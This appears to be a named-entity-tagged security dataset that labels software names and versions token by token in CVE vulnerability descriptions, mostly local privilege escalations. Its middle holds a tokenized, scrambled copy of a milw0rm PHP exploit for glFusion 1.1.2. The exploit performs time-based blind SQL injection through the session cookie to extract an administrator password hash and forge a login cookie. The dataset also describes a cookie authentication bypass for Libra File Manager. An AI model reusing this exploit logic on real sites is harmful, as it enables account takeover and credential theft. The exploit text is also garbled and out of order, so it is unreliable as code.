FortiGuard SN
FortiAuthenticator SN
before SV
3.0 SV
allows O
remote O
administrators O
to O
gain O
privileges O
via O
the O
command O
line O
interface O
. O

Race O
condition O
in O
win32k.sys O
in O
the O
kernel-mode O
drivers O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
, O
R2 SV
, O
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
Gold SV
and SV
SP1 SV
, O
Windows SN
8 SV
, O
Windows SN
Server SV
2012 SV
, O
and O
Windows SN
RT SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
that O
leverages O
improper O
handling O
of O
objects O
in O
memory O
, O
aka O
Win32k O
Race O
Condition O
Vulnerability O
. O

The O
Microsoft O
Antimalware O
Client O
in O
Windows O
Defender O
on O
Windows SN
8 SV
and O
Windows SN
RT SV
uses O
an O
incorrect O
pathname O
for O
MsMpEng.exe O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Microsoft O
Antimalware O
Improper O
Pathname O
Vulnerability O
. O

The O
ACMELOGIN O
implementation O
in O
HP SN
OpenVMS SN
8.3 SV
and SV
8.4 SV
on O
the O
Alpha O
platform O
, O
and O
8.3 SV
, O
8.3-1H1 SV
, O
and SV
8.4 SV
on O
the O
Itanium O
platform O
, O
when O
the O
SYS O
$ O
ACM O
system O
service O
is O
enabled O
, O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

Integer O
overflow O
in O
the O
Client/Server O
Run-time O
Subsystem O
( O
aka O
CSRSS O
) O
in O
the O
Win32 O
subsystem O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
and O
Windows SN
Server SV
2003 SV
SP2 SV
, O
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
application O
that O
triggers O
an O
incorrect O
memory O
assignment O
for O
a O
user O
transaction O
, O
aka O
CSRSS O
Local O
EOP O
SrvWriteConsoleOutputString O
Vulnerability O
. O

Buffer O
overflow O
in O
the O
Journal O
Based O
Backup O
( O
JBB O
) O
feature O
in O
the O
backup-archive O
client O
in O
IBM SN
Tivoli SN
Storage SN
Manager SN
( O
TSM SN
) O
before SV
5.4.3.4 SV
, O
5.5.x SV
before SV
5.5.3 SV
, O
6.x SV
before SV
6.1.4 SV
, O
and SV
6.2.x SV
before SV
6.2.2 SV
on O
Windows O
and O
AIX O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

NOTE O
: O
some O
of O
these O
details O
are O
obtained O
from O
third O
party O
information O
. O

Untrusted O
search O
path O
vulnerability O
in O
PKZIP SN
before SV
12.50.0014 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
dwmapi.dll O
file O
in O
the O
current O
working O
directory O
, O
as O
demonstrated O
by O
a O
directory O
that O
contains O
a O
.zip O
file O
. O

Multiple O
untrusted O
search O
path O
vulnerabilities O
in O
Nuance SN
PDF SN
Reader SN
6.0 SV
allow O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
( O
1 O
) O
dwmapi.dll O
or O
( O
2 O
) O
exceptiondumpdll.dll O
file O
in O
the O
current O
working O
directory O
, O
as O
demonstrated O
by O
a O
directory O
that O
contains O
a O
.pdf O
file O
. O

Unspecified O
vulnerability O
in O
Microsoft O
Windows O
on O
32-bit O
platforms O
allows O
local O
users O
to O
gain O
privileges O
via O
unknown O
vectors O
, O
as O
exploited O
in O
the O
wild O
in O
July O
2010 O
by O
the O
Stuxnet O
worm O
, O
and O
identified O
by O
Microsoft O
researchers O
and O
other O
researchers O
. O

The O
( O
1 O
) O
mdb O
and O
( O
2 O
) O
mdb-symbolreader O
scripts O
in O
mono-debugger SN
2.4.3 SV
, O
and SV
other SV
versions SV
before SV
2.8.1 SV
, O
place O
a O
zero-length O
directory O
name O
in O
the O
LD_LIBRARY_PATH O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
shared O
library O
in O
the O
current O
working O
directory O
. O

NOTE O
: O
this O
might O
overlap O
CVE-2010-3141 O
and O
CVE-2010-3142 O
. O

Untrusted O
search O
path O
vulnerability O
in O
Microsoft SN
Office SN
2007 SV
SP2 SV
and SV
2010 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
the O
current O
working O
directory O
, O
aka O
Insecure O
Library O
Loading O
Vulnerability O
. O

The O
Windows O
kernel-mode O
drivers O
in O
win32k.sys O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
, O
Windows SN
Server SV
2003 SV
SP2 SV
, O
Windows SN
Vista SV
SP1 SV
and SV
SP2 SV
, O
and O
Windows SN
Server SV
2008 SV
Gold SV
and SV
SP2 SV
do O
not O
properly O
validate O
user-mode O
input O
passed O
to O
kernel O
mode O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Win32k O
User O
Input O
Validation O
Vulnerability O
. O

The O
Client/Server O
Runtime O
Subsystem O
( O
aka O
CSRSS O
) O
in O
the O
Win32 O
subsystem O
in O
Microsoft SN
Windows SN
XP SV
SP2 SV
and SV
SP3 SV
and SV
Server SV
2003 SV
SP2 SV
, O
when O
a O
Chinese O
, O
Japanese O
, O
or O
Korean O
locale O
is O
enabled O
, O
does O
not O
properly O
allocate O
memory O
for O
transactions O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
CSRSS O
Local O
Elevation O
of O
Privilege O
Vulnerability O
. O

The O
USB O
service O
in O
VMware SN
Workstation SN
7.0 SV
before SV
7.0.1 SV
build SV
227600 SV
and O
VMware SN
Player SN
3.0 SV
before SV
3.0.1 SV
build SV
227600 SV
on O
Windows O
might O
allow O
host O
OS O
users O
to O
gain O
privileges O
by O
placing O
a O
Trojan O
horse O
program O
at O
an O
unspecified O
location O
on O
the O
host O
OS O
disk O
. O

MeetingTime O
in O
Cisco SN
Unified SN
MeetingPlace SN
6 SV
before SV
MR5 SV
, O
and SV
possibly SV
5 SV
, O
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
via O
a O
modified O
authentication O
sequence O
, O
aka O
Bug O
ID O
CSCsv66530 O
. O

Use-after-free O
vulnerability O
in O
the O
fasync_helper O
function O
in O
fs/fcntl.c O
in O
the O
Linux SN
kernel SN
before SV
2.6.33-rc4-git1 SV
allows O
local O
users O
to O
gain O
privileges O
via O
vectors O
that O
include O
enabling O
O_ASYNC O
( O
aka O
FASYNC O
or O
FIOASYNC O
) O
on O
a O
locked O
file O
, O
and O
then O
closing O
this O
file O
. O

Heap-based O
buffer O
overflo O
w O
in O
w O
in O
Sun SN
Solaris SN
8 SV
through SV
10 SV
, O
and O
OpenSolaris SN
before SV
snv_124 SV
, O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

NOTE O
: O
this O
can O
be O
leveraged O
with O
a O
separate O
SQL O
injection O
vulnerability O
to O
steal O
hashes O
. O

glFusion SN
before SV
1.1.3 SV
performs O
authentication O
with O
a O
user-provided O
password O
hash O
instead O
of O
a O
password O
, O
which O
allows O
remote O
attackers O
to O
gain O
privileges O
by O
obtaining O
the O
hash O
and O
using O
it O
in O
the O
glf_password O
cookie O
, O
aka O
User O
Masquerading O
. O

< O
php O
glFusion SN
< SV
= SV
1.1.2 SV
COM_applyFilter O
( O
) O
/cookies O
remote O
blind O
sql O
injection O
exploit O
by O
Nine O
: O
Situations O
: O
Group O
: O
:bookoo O
our O
site O
: O
software O
site O
: O
google O
dork O
: O
Page O
created O
in O
seconds O
by O
glFusion O
+RSS O
Found O
another O
vector O
of O
injection O
in O
/private/system/lib-session.php O
near O
lines O
97-117 O
: O
... O
if O
( O
isset O
( O
$ O
_COOKIE O
[ O
$ O
_CONF O
[ O
cookie_session O
sessid O
= O
COM_applyFilter O
( O
$ O
_COOKIE O
[ O
$ O
_CONF O
[ O
cookie_session O
if O
( O
$ O
_SESS_VERBOSE O
) O
{ O
COM_errorLog O
( O
got O
$ O
sessid O
as O
the O
session O
id O
from O
lib-sessions.php O
,1 O
) O
; O
} O
$ O
userid O
= O
SESS_getUserIdFromSession O
( O
$ O
sessid O
, O
$ O
_CONF O
[ O
ession_cookie_timeout O
SERVER O
[ O
REMOTE_ADDR O
CONF O
[ O
cookie_ip O
] O
) O
; O
if O
( O
$ O
_SESS_VERBOSE O
) O
{ O
COM_errorLog O
( O
Got O
$ O
userid O
as O
User O
ID O
from O
the O
session O
ID O
,1 O
) O
; O
} O
if O
( O
$ O
userid O
1 O
) O
{ O
Check O
user O
status O
$ O
status O
= O
SEC_checkUserStatus O
( O
$ O
userid O
) O
; O
if O
( O
( O
$ O
status O
USER_ACCOUNT_ACTIVE O
status O
USER_ACCOUNT_AWAITING_ACTIVATION O
) O
) O
{ O
$ O
user_logged_in O
= O
1 O
; O
SESS_updateSessionTime O
( O
$ O
sessid O
, O
$ O
_CONF O
[ O
cookie_ip O
see O
SESS_updateSessionTime O
( O
) O
function O
near O
lines O
418-436 O
: O
... O
function O
SESS_updateSessionTime O
( O
$ O
sessid O
, O
$ O

hash O
: O
. O
$ O
_hash O
. O
[ O
] O

192.168.0.1 O
/glfusion O
bookoo O
pass O
. O

Examples O
: O
php O
. O
$ O
argv O
. O

prefix O
- O
try O
to O
extract O
table O
prefix O
from O
information.schema O
. O

; O
glfusion=9999999999 O
; O
; O
$ O
starttime O
= O
time O
( O
) O
; O
$ O
out O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
if O
( O
chk_err O
( O
$ O
out O
) O
) O
{ O
die O
( O
[ O
! O
] O

function O
find_prefix O
( O
) O
{ O
global O
$ O
host O
, O
$ O
port O
, O
$ O
path O
, O
$ O
delayfunc O
, O
$ O
_user O
, O
$ O
_pwd O
, O
$ O
n O
; O
$ O
_tn O
= O
TABLE_NAME O
; O
case O
important O

true O
: O
false O
; O
if O
( O
$ O
win O
) O
{ O
! O
dl O
( O
php_curl.dll O
) O

You O
need O
the O
curl O
extesion O
loaded O
! O

So O
the O
function O
returns O
a O
valid O
userid O
and O
, O
if O
you O
know O
an O
existent O
sessid O
in O
table O
, O
you O
can O
inject O
queries O
in O
cookies O
, O
like O
this O
: O
Cookie O
: O
glf_session=12345678 O
[ O
SQL O
HERE O
] O
; O
glfusion=9999999999 O
; O
This O
tool O
use O
delays O
to O
extract O
an O
admin O
hash O
from O
users O
table O
, O
but O
needs O
a O
simple O
user O
account O
; O
some O
improvement O
in O
find_prefix O
( O
) O
; O
working O
against O
MySQL O
> O
= O
5.0.12 O
, O
where O
SLEEP O
( O
) O
function O
is O
availiable O
or O
... O
if O
you O
find O
another O
solution O
for O
delays O
, O
with O
MySQL O
> O
= O
4.1 O
, O
which O
supports O
SELECT O
subqueries O
( O
BENCHMARK O
( O
) O
can O
not O
be O
used O
because O
commas O
are O
filtered O
by O
COM_applyFilter O
( O
) O
function O
) O
$ O
err O

print O
( O
[ O
] O
Attacking O
syntax O
( O
) O
; O
$ O
_f_prefix O
= O
false O
; O
$ O
_use_proxy O
= O
false O
; O
$ O
port O
= O
80 O
; O
$ O
_skiptest O
= O
false O
; O
$ O
_verbose O
= O
false O
; O
$ O
_test O
= O
false O
; O
for O
( O
$ O
i O
= O
3 O
; O
$ O
i O
< O
$ O
argc O
; O
$ O
i++ O
) O
{ O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
prefix O
f_prefix O
= O
true O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
proxy O
use_proxy O
= O
true O
; O
$ O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
proxy_host O
= O
$ O
tmp O
; O
$ O
proxy_port O
= O
( O
int O
) O
$ O
tmp O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
port O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
port O
= O
( O
int O
) O
$ O
tmp O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O
uid O
tmp O
= O
explode O
argv O
[ O
$ O
i O
] O
) O
; O
$ O
uid O
= O
( O
int O
) O
$ O
tmp O
; O
$ O
where O
= O
uid= O
$ O
uid O
; O
} O
if O
( O
stristr O
( O
$ O
argv O
[ O
$ O
i O
] O
, O

) O
; O
} O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_RETURNTRANSFER O
, O
1 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_USERAGENT O
, O
Mozilla/5.0 O
( O
Windows O
; O
U O
; O
Windows O
NT O
5.1 O
; O
it O
; O
rv:1.9.0.7 O
) O
Gecko/2009021910 O
Firefox/3.0.7 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_TIMEOUT O
, O
0 O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_HEADER O
, O
1 O
) O
; O
$ O
cookies O
= O
array O
( O
Cookie O
: O
. O
$ O
ck O
) O
; O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_HTTPHEADER O
, O
$ O
cookies O
) O
; O
if O
( O
$ O
_use_proxy O
) O
{ O
curl_setopt O
( O
$ O
ch O
, O
CURLOPT_PROXY O
, O
$ O
proxy_host O
. O

users O
WHERE O
$ O
where O
LIMIT O
1 O
) O
THEN O
$ O
delayfunc O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

; O
glf_theme=nouveau O
; O
; O

test O
- O
run O
only O
tests O
. O

Not O
vulnerable O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
1 O
) O
THEN O
1 O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

; O
sleep O
( O
$ O
n O
) O
; O
break O
if O
( O
$ O
f O
false O
) O
{ O
die O
( O
[ O
! O
] O

Unknown O
error O
print O
your O
cookie- O
> O
glfusion= O
. O
$ O
uid O
. O

) O
; O
} O
else O
{ O
curl_close O
( O
$ O
ch O
) O
; O
} O
return O
$ O
_d O
; O
} O
function O
chk_err O
( O
$ O
s O
) O
{ O
if O
( O
stripos O
( O
$ O
s O
, O
x41 O
x6e O
x20 O
x53 O
x51 O
x4c O
x20 O
x65 O
x72 O
x72 O
x6f O
x72 O
x20 O
x68 O
x61 O
x73 O
x20 O
x6f O
x63 O
x63 O
x75 O
x72 O
x72 O
x65 O
x64 O
) O
) O
{ O
return O
true O
; O
} O
else O
{ O
return O
false O
; O
} O
} O
function O
chk_login O
( O
$ O
s O
) O
{ O
if O
( O
stripos O
( O
$ O
s O
, O
x50 O
x6c O
x65 O
x61 O
x73 O
x65 O
x20 O
x65 O
x6e O
x74 O
x65 O
x72 O
x20 O
x79 O
x6f O
x75 O
x72 O
x20 O
x75 O
x73 O
x65 O
x72 O
x20 O
x6e O
x61 O
x6d O
x65 O
x20 O
x61 O
x6e O
x64 O
x20 O
x70 O
x61 O
x73 O
x73 O
x77 O
x6f O
x72 O
x64 O
x20 O
x62 O
x65 O
x6c O
x6f O
x77 O
) O
) O
{ O
die O
( O
[ O
! O
] O

$ O
_table_prefix O
j O
= O
-15 O
; O
print O
[ O
] O
Initiating O
table O
prefix O
extraction O
while O
( O
! O
$ O
null_f O
) O
{ O
$ O
mn O
= O
0x00 O
; O
$ O
mx O
= O
0xff O
; O
while O
( O
1 O
) O
{ O
if O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
% O
2 O
1 O
) O
{ O
$ O
c O
= O
round O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
2 O
) O
- O
1 O
; O
} O
else O
{ O
$ O
c O
= O
round O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
2 O
) O
; O
} O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
( O
ASCII O
( O
SUBSTR O
( O
. O
$ O
_tn O
. O

die O
( O
$ O
err O
) O
: O
nil O
; O
} O
} O
function O
syntax O
( O
) O
{ O
print O
( O
Syntax O
: O
php O
. O
$ O
argv O
. O

Mysql O
, O
like O
php O
, O
in O
comparing O
them O
, O
only O
considers O
the O
first O
integer O
values O
of O
the O
supplied O
string O
. O

MySQL O
< O
4.1 O
! O

MySQL O
> O
= O
5.0.12 O
cookies O
z O
= O
0 O
; O
$ O
_w O
= O
10 O
; O
for O
( O
$ O
i O
= O
0 O
; O
$ O
i O
< O
= O
$ O
_w O
; O
$ O
i O
starttime O
= O
time O
( O
) O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
$ O
_z O
= O
$ O
_z O
+ O
$ O
difftime O
; O
} O
$ O
_y O
= O
round O
( O
$ O
_z O
$ O
_w O
) O
; O
$ O
n O
= O
$ O
n O
+ O
$ O
_y O
; O
if O
( O
$ O
_y O
< O
0 O
) O
{ O
print O
( O
[ O
] O
Adjusting O
delay O
time O
of O
. O
$ O
_y O
. O

[ O
host O
] O
[ O
path O
] O
[ O
user O
] O
[ O
pass O
] O
[ O
OPTIONS O
] O
. O

; O
$ O
err O

; O
glfusion=9999999999 O
; O
; O
$ O
url O
= O
$ O
starttime O
= O
time O
( O
) O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
if O
( O
chk_err O
( O
$ O
_o O
) O
) O
{ O
die O
( O
[ O
! O
] O

proxy O
: O
[ O
host O
: O
port O
] O
- O
use O
proxy O
. O

LIKE O
0x25747261636b6261636b636f646573 O
LIMIT O
1 O
) O
THEN O
$ O
delayfunc O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

port O
: O
[ O
port O
] O
- O
specify O
a O
port O
. O

default- O
> O
gl_ O
. O

This O
script O
is O
intended O
to O
be O
launched O
from O
the O
cli O
! O

FROM O
$ O
j O
FOR O
1 O
c O
. O
) O

milw0rm.com O
[ O
2009-04-03 O
] O

Table O
prefix O
table_prefix O
. O

Table O
prefix- O
> O
. O
$ O
_table_prefix O
. O

WHERE O
. O
$ O
_tn O
. O

; O
} O
return O
$ O
sessid O
; O
} O
function O
tests O
( O
) O
{ O
global O
$ O
host O
, O
$ O
port O
, O
$ O
path O
, O
$ O
n O
, O
$ O
delayfunc O
; O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

FROM O
. O
$ O
_ift O
. O

; O
glfusion=9999999999 O
; O
; O
$ O
url O
o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
if O
( O
chk_err O
( O
$ O
_o O
) O
) O
{ O
print O
( O
[ O
] O

second O
( O
s O
) O
- O
> O
delay O
= O
. O
$ O
n O
. O

information_schema O
not O
availiable O
! O

php O
. O
$ O
argv O
. O

function O
login O
( O
) O
{ O
global O
$ O
url O
, O
$ O
host O
, O
$ O
port O
, O
$ O
path O
, O
$ O
_user O
, O
$ O
_pwd O
, O
$ O
_verbose O
; O
$ O
url O
= O
$ O
out O
= O
_s O
( O
$ O
url O
, O
, O
1 O
, O
loginname= O
$ O
_user O
& O
passwd= O
$ O
_pwd O
& O
bb2_screener_= O
) O
; O
chk_login O
( O
$ O
out O
) O
; O
$ O
tmp O
= O
explode O
( O
x0d O
x0a O
x0d O
x0a O
, O
$ O
out O
) O
; O
$ O
tmp O
= O
explode O
( O
x67 O
x6c O
x66 O
x5f O
x73 O
x65 O
x73 O
x73 O
x69 O
x6f O
x6e O
x3d O
, O
$ O
tmp O
) O
; O
$ O
tmp O
= O
explode O
( O
x3b O
, O
$ O
tmp O
) O
; O
$ O
sessid O
= O
( O
int O
) O
$ O
tmp O
; O
! O
$ O
sessid O

$ O
_ift O
= O
information_schema.TABLES O
; O

SLEEP O
( O
) O
function O
not O
availiable O
! O

You O
have O
exceeded O
the O
number O
of O
allowed O
login O
attempts O
. O

uid O
: O
[ O
n O
] O
- O
specify O
an O
uid O
other O
than O
default O
( O
2 O
, O
usually O
admin O
) O
. O

: O
. O
$ O
proxy_port O
d O
= O
curl_exec O
( O
$ O
ch O
) O
; O
if O
( O
curl_errno O
( O
$ O
ch O
) O
) O
{ O
die O
( O
[ O
! O
] O

; O
glfusion=9999999999 O
; O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
if O
( O
chk_err O
( O
$ O
_o O
) O
) O
{ O
die O
( O
[ O
! O
] O

MySQL O
< O
5.0 O
) O
; O
} O
if O
( O
$ O
difftime O
( O
$ O
n-1 O
) O
) O
{ O
$ O
mn O
= O
$ O
c O
; O
sleep O
( O
$ O
n O
) O
; O
} O
else O
{ O
$ O
mx O
= O
$ O
c O
- O
1 O
; O
} O
if O
( O
( O
$ O
mx- O
$ O
mn O
1 O
) O
or O
( O
$ O
mx O
$ O
mn O
) O
) O
{ O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
( O
ASCII O
( O
SUBSTR O
( O
. O
$ O
_tn O
. O

sql O
error O
. O

) O
; O
if O
( O
$ O
_f_prefix O
true O
) O
{ O
$ O
prefix O
= O
find_prefix O
c O
= O
array O
( O
) O
; O
$ O
c O
= O
array_merge O
( O
$ O
c O
, O
range O
( O
0x30 O
, O
0x39 O
) O
) O
; O
$ O
c O
= O
array_merge O
( O
$ O
c O
, O
range O
( O
0x61 O
, O
0x66 O
) O
) O
; O
$ O
url O
hash O
print O
Initiating O
hash O
extraction O
for O
( O
$ O
j O
= O
1 O
; O
$ O
j O
< O
0x21 O
; O
$ O
j++ O
) O
{ O
for O
( O
$ O
i O
= O
0 O
; O
$ O
i O
< O
= O
0xff O
; O
$ O
i O
f O
= O
false O
; O
if O
( O
in_array O
( O
$ O
i O
, O
$ O
c O
) O
) O
{ O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
( O
ASCII O
( O
SUBSTR O
( O
passwd O
FROM O
$ O
j O
FOR O
1 O
) O
) O
= O
$ O
i O
) O
FROM O
. O
$ O
prefix O
. O

verbose O
- O
show O
more O
informations O
. O

Unable O
to O
login O
nil O
; O
if O
( O
$ O
_verbose O
) O
{ O
print O
[ O
] O

Options O
: O
. O

) O
; O
} O
sleep O
( O
$ O
n O
) O
; O
break O
j O
; O
} O
print O
[ O
] O

skiptest O
- O
skip O
preliminary O
tests O
. O

Unable O
to O
login O
: O
wrong O
credentials O
. O

MySQL O
< O
5.0.12 O
else O
{ O
print O
( O
[ O
] O
SLEEP O
( O
) O
function O
availiable O
. O

) O
; O
} O
else O
{ O
die O
( O
[ O
] O

( O
md5_sess_id O
= O
$ O
sessid O
) O
AND O
( O
start_time O
$ O
mintime O
) O
AND O
( O
remote_ip O
= O
$ O
remote_ip O
else O
{ O
$ O
sql O
= O
SELECT O
uid O
FROM O
{ O
$ O
_TABLES O
[ O
essions O
] O
} O
WHERE O
. O

) O
; O
} O
if O
( O
$ O
difftime O
( O
$ O
n-1 O
) O
) O
{ O
$ O
f O
= O
true O
; O
$ O
_hash O
.= O
chr O
( O
$ O
i O
) O
; O
print O
[ O
] O

die O
( O
$ O
err O
) O
: O
nil O
; O
} O
else O
{ O
! O
dl O
( O
php_curl.so O
) O

( O
sess_id O
= O
$ O
sessid O
) O
AND O
( O
start_time O
$ O
mintime O
) O
AND O
( O
remote_ip O
= O
$ O
remote_ip O
compares O
the O
supplied O
sessid O
value O
with O
the O
sessid O
value O
from O
sessions O
table O
which O
is O
an O
integer O
. O

; O
if O
( O
php_sapi_name O
( O
) O
< O
cli O
) O
{ O
die O
( O
$ O
err O
) O
; O
} O
if O
( O
! O
extension_loaded O
( O
curl O
win O
= O
( O
strtoupper O
( O
substr O
( O
PHP_OS O
, O
0 O
, O
3 O
) O
) O
WIN O
) O

Note O
that O
the O
query O
in O
SESS_getUserIdFromSession O
( O
) O
function O
: O
... O
if O
( O
$ O
md5_based O
1 O
) O
{ O
$ O
sql O
= O
SELECT O
uid O
FROM O
{ O
$ O
_TABLES O
[ O
essions O
] O
} O
WHERE O
. O

) O
; O
} O
if O
( O
stripos O
( O
$ O
s O
, O
x59 O
x6f O
x75 O
x20 O
x68 O
x61 O
x76 O
x65 O
x20 O
x65 O
x78 O
x63 O
x65 O
x65 O
x64 O
x65 O
x64 O
x20 O
x74 O
x68 O
x65 O
x20 O
x6e O
x75 O
x6d O
x62 O
x65 O
x72 O
x20 O
x6f O
x66 O
x20 O
x61 O
x6c O
x6c O
x6f O
x77 O
x65 O
x64 O
x20 O
x6c O
x6f O
x67 O
x69 O
x6e O
x20 O
x61 O
x74 O
x74 O
x65 O
x6d O
x70 O
x74 O
x73 O
x2e O
x20 O
x20 O
x50 O
x6c O
x65 O
x61 O
x73 O
x65 O
x20 O
x74 O
x72 O
x79 O
x20 O
x61 O
x67 O
x61 O
x69 O
x6e O
x20 O
x6c O
x61 O
x74 O
x65 O
x72 O
x2e O
) O
) O
{ O
die O
( O
[ O
! O
] O

) O
; O
} O
else O
{ O
print O
( O
[ O
] O
Subquery O
works O
! O
- O
> O
Mysql O
> O
= O
4.1 O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
1 O
) O
THEN O
1 O
ELSE O
SLEEP O
( O
0 O
) O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

default- O
> O
80 O
. O

FROM O
$ O
j O
FOR O
1 O
mn O
. O
) O

192.168.0.1 O
bookoo O
pass O
prefix O
uid:3 O
) O
; O
die O
( O
) O
; O
} O
error_reporting O
( O
E_ALL O
^ O
E_NOTICE O
) O
; O
$ O
host O
= O
$ O
argv O
; O
$ O
path O
= O
$ O
argv O
; O
$ O
_user O
= O
$ O
argv O
; O
$ O
_pwd O
= O
$ O
argv O
; O
$ O
prefix O
= O
gl_ O
; O
default O
$ O
uid O
= O
2 O
; O
$ O
where O
= O
uid= O
$ O
uid O
; O
user O
id O
, O
usually O
admin O
, O
anonymous O
= O
1 O
$ O
argv O

192.168.0.1 O
bookoo O
pass O
prefix O
proxy:1.1.1.1:8080 O
. O

; O
glfusion=9999999999 O
; O
; O
$ O
url O
= O
$ O
starttime O
= O
time O
( O
) O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
if O
( O
$ O
difftime O
( O
$ O
n-1 O
) O
) O
{ O
if O
( O
$ O
mn O
< O
0 O
) O
{ O
$ O
_table_prefix O
= O
chr O
( O
$ O
mn O
) O
. O
$ O
_table_prefix O
; O
} O
else O
{ O
$ O
null_f O
= O
true O
; O
} O
} O
else O
{ O
$ O
_table_prefix O
= O
chr O
( O
$ O
mx O
) O
. O
$ O
_table_prefix O
; O
} O
if O
( O
! O
$ O
null_f O
) O
{ O
print O
( O
[ O
] O

; O
return O
$ O
_table_prefix O
; O
} O
$ O
n O
= O
30 O
; O
delay O
n O
seconds O
if O
( O
! O
$ O
_skiptest O
) O
{ O
print O
[ O
] O
Initiating O
preliminary O
tests O
tests O
( O
) O
; O
} O
if O
( O
$ O
_test O
) O
{ O
die O
delayfunc O
= O
SLEEP O
( O
. O
$ O
n O
. O

; O
glf_password= O
. O
$ O
_hash O
. O

glFusion SN
1.1.2 SV
- O
COM_applyFilter O
( O
) O
/cookies O
Blind O
SQL O
Injection O

Untrusted O
search O
path O
vulnerability O
in O
the O
Gentoo O
package O
of O
Xpdf SN
before SV
3.02-r2 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
xpdfrc O
file O
in O
the O
current O
working O
directory O
, O
related O
to O
an O
unset O
SYSTEM_XPDFRC O
macro O
in O
a O
Gentoo O
build O
process O
that O
uses O
the O
poppler O
library O
. O

The O
kernel O
in O
Microsoft SN
Windows SN
2000 SV
SP4 SV
, O
XP SV
SP2 SV
and SV
SP3 SV
, O
Server SV
2003 SV
SP2 SV
, O
Vista SV
Gold SV
, O
SP1 SV
, O
and SV
SP2 SV
, O
and SV
Server SV
2008 SV
SP2 SV
does O
not O
properly O
validate O
an O
argument O
to O
an O
unspecified O
system O
call O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Windows O
Driver O
Class O
Registration O
Vulnerability O
. O

Libra SN
File SN
Manager SN
1.18 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
bypass O
authentication O
and O
gain O
privileges O
by O
setting O
the O
user O
and O
pass O
cookies O
to O
1 O
. O

[ O
+ O
] O
Libra O
PHP O
File O
Manager O
Insecure O
Cookie O
Handling O
Vulnerability O
[ O
+ O
